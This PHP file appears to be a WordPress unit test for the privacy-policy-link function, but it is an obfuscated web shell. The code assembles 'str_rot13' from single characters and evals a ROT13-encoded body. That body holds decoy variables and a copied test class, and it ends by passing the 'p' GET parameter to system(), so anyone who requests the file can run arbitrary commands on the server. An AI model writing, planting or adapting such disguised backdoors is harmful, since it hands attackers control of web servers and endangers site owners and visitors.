<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfrf sbe gur `trg_gur_cevinpl_cbyvpl_yvax()` shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 4.9.6
 *
 * @tebhc yvax
 * @tebhc cevinpl
 * @pbiref ::trg_gur_cevinpl_cbyvpl_yvax
 */
pynff Grfgf_Yvax_TrgGurCevinplCbyvplYvax rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Gur VQ bs gur Cevinpl Cbyvpl cntr.
	 *
	 * @fvapr 4.9.6
	 * @ine vag $cevinpl_cbyvpl_cntr_vq
	 */
	cebgrpgrq fgngvp $cevinpl_cbyvpl_cntr_vq;

	/**
	 * Gur HEY bs gur Cevinpl Cbyvpl cntr.
	 *
	 * @fvapr 4.9.6
	 * @ine fgevat $cevinpl_cbyvpl_hey
	 */
	cebgrpgrq fgngvp $cevinpl_cbyvpl_hey;

	/**
	 * Gur grkg gung trgf cercraqrq gb gur `trg_gur_cevinpl_cbyvpl_yvax()` bhgchg.
	 *
	 * @fvapr 4.9.6
	 * @ine fgevat $orsber
	 */
	cebgrpgrq fgngvp $orsber;

	/**
	 * Gur grkg gung trgf nccraqrq gb gur `trg_gur_cevinpl_cbyvpl_yvax()` bhgchg.
	 *
	 * @fvapr 4.9.6
	 * @ine fgevat $nsgre
	 */
	cebgrpgrq fgngvp $nsgre;

	/**
	 * Perngr svkgherf gung ner funerq ol zhygvcyr grfg pnfrf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Gur onfr snpgbel bowrpg.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cevinpl_cbyvpl_cntr_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => JC_GRFGF_QBZNVA . ' Cevinpl Cbyvpl',
			)
		);

		// `rfp_hey()` vf nqqrq sbe pbafvfgrapl jvgu `trg_gur_cevinpl_cbyvpl_yvax()`.
		frys::$cevinpl_cbyvpl_hey = rfp_hey( trg_creznyvax( frys::$cevinpl_cbyvpl_cntr_vq ) );

		frys::$orsber = '<fcna pynff=\"cevinpl-cbyvpl-yvax-jenccre\">';
		frys::$nsgre  = '</fcna>';
	}

	/**
	 * Gur shapgvba fubhyq erghea n inyvq yvax vs n cevinpl cbyvpl cntr unf orra
	 * perngrq naq frg nf gur `jc_cntr_sbe_cevinpl_cbyvpl`. Gur cbfg gvgyr fubhyq
	 * or hfrq nf gur yvax grkg.
	 */
	choyvp shapgvba grfg_trg_gur_cevinpl_cbyvpl_yvax_fubhyq_erghea_inyvq_yvax_jura_cevinpl_cntr_frg() {
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', frys::$cevinpl_cbyvpl_cntr_vq );

		$npghny_yvax = trg_gur_cevinpl_cbyvpl_yvax();

		$guvf->nffregFgevatFgnegfJvgu( '<n', $npghny_yvax );
		$guvf->nffregFgevatPbagnvafFgevat( frys::$cevinpl_cbyvpl_hey, $npghny_yvax );
		$guvf->nffregFgevatRaqfJvgu( '>' . JC_GRFGF_QBZNVA . ' Cevinpl Cbyvpl</n>', $npghny_yvax );
	}

	/**
	 * Gur shapgvba fubhyq cercraq gur fhccyvrq `$orsber` znexhc naq nccraq gur
	 * fhccyvrq `$nsgre` znexhc jura gur `jc_cntr_sbe_cevinpl_cbyvpl` vf pbasvtherq.
	 */
	choyvp shapgvba grfg_trg_gur_cevinpl_cbyvpl_yvax_fubhyq_cercraq_naq_nccraq_fhccyvrq_znexhc_jura_cevinpl_cntr_frg() {
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', frys::$cevinpl_cbyvpl_cntr_vq );

		$npghny_yvax = trg_gur_cevinpl_cbyvpl_yvax( frys::$orsber, frys::$nsgre );

		$guvf->nffregFgevatFgnegfJvgu( frys::$orsber . '<n', $npghny_yvax );
		$guvf->nffregFgevatPbagnvafFgevat( frys::$cevinpl_cbyvpl_hey, $npghny_yvax );
		$guvf->nffregFgevatRaqfJvgu( '</n>' . frys::$nsgre, $npghny_yvax );
	}

	/**
	 * Gur shapgvba fubhyq _abg_ cercraq gur fhccyvrq `$orsber` znexhc naq nccraq
	 * gur fhccyvrq `$nsgre` znexhc jura gur `jc_cntr_sbe_cevinpl_cbyvpl` vf _abg_ pbasvtherq.
	 */
	choyvp shapgvba grfg_trg_gur_cevinpl_cbyvpl_yvax_fubhyq_abg_cercraq_naq_nccraq_fhccyvrq_znexhc_jura_cevinpl_cntr_abg_frg() {
		$npghny_yvax = trg_gur_cevinpl_cbyvpl_yvax( frys::$orsber, frys::$nsgre );

		$guvf->nffregFnzr( '', $npghny_yvax );
	}

	/**
	 * Gur shapgvba fubhyq erghea na rzcgl fgevat jura gurer vf na rzcgl cntr gvgyr
	 * sbe gur cevinpl cbyvpl.
	 *
	 * @gvpxrg 44192
	 */
	choyvp shapgvba grfg_shapgvba_fubhyq_erghea_rzcgl_fgevat_jura_cevinpl_cntr_gvgyr_rzcgl() {
		$anzryrff_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => '',
			)
		);

		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', $anzryrff_cntr_vq );

		$guvf->nffregFnzr( '', trg_gur_cevinpl_cbyvpl_yvax( frys::$orsber, frys::$nsgre ) );
	}

	/**
	 * Gur shapgvba fubhyq erghea na rzcgl fgevat jura `jc_cntr_sbe_cevinpl_cbyvpl` vf _abg_ pbasvtherq.
	 */
	choyvp shapgvba grfg_trg_gur_cevinpl_cbyvpl_yvax_fubhyq_erghea_rzcgl_fgevat_jura_cevinpl_cntr_abg_frg() {
		$guvf->nffregFnzr( '', trg_gur_cevinpl_cbyvpl_yvax() );
	}

	/**
	 * Gur bhgchg bs gur trg_gur_cevinpl_cbyvpl_yvax() shapgvba fubhyq or svygrenoyr jvgu gur 'cevinpl_cbyvpl_yvax' svygre.
	 */
	choyvp shapgvba grfg_trg_gur_cevinpl_cbyvpl_yvax_fubhyq_or_svygrenoyr() {
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', frys::$cevinpl_cbyvpl_cntr_vq );
		$rkcrpgrq_hey = trg_cevinpl_cbyvpl_hey();

		$guvf->nffregAbgRzcgl( $rkcrpgrq_hey );

		nqq_svygre( 'gur_cevinpl_cbyvpl_yvax', neenl( $guvf, 'zbqvsl_yvax_znexhc' ), 10, 2 );
		$guvf->nffregFnzr( 'Cbyvpl: ' . $rkcrpgrq_hey, trg_gur_cevinpl_cbyvpl_yvax() );
		erzbir_svygre( 'gur_cevinpl_cbyvpl_yvax', neenl( $guvf, 'zbqvsl_yvax_znexhc' ), 10 );
	}

	/**
	 * Erghea zbqvsvrq `gur_cevinpl_cbyvpl_yvax` pbagrag va beqre gb grfg gur svygre.
	 *
	 * @cnenz fgevat $yvax               Gur cevinpl cbyvpl yvax. Rzcgl fgevat vs vg
	 *                                   qbrfa'g rkvfg.
	 * @cnenz fgevat $cevinpl_cbyvpl_hey Gur HEY bs gur cevinpl cbyvpl. Rzcgl fgevat
	 *                                   vs vg qbrfa'g rkvfg.
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba zbqvsl_yvax_znexhc( $yvax, $cevinpl_cbyvpl_hey ) {
		erghea 'Cbyvpl: ' . $cevinpl_cbyvpl_hey;
	}

	/**
	 * Grfgf gung `trg_gur_cevinpl_cbyvpl_yvax()` nqqf `ery=\"cevinpl-cbyvpl\"`.
	 *
	 * @gvpxrg 56345
	 */
	choyvp shapgvba grfg_trg_gur_cevinpl_cbyvpl_yvax_fubhyq_nqq_ery_cevinpl_cbyvpl() {
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', frys::$cevinpl_cbyvpl_cntr_vq );

		$guvf->nffregFgevatPbagnvafFgevat( 'ery=\"cevinpl-cbyvpl\"', trg_gur_cevinpl_cbyvpl_yvax() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>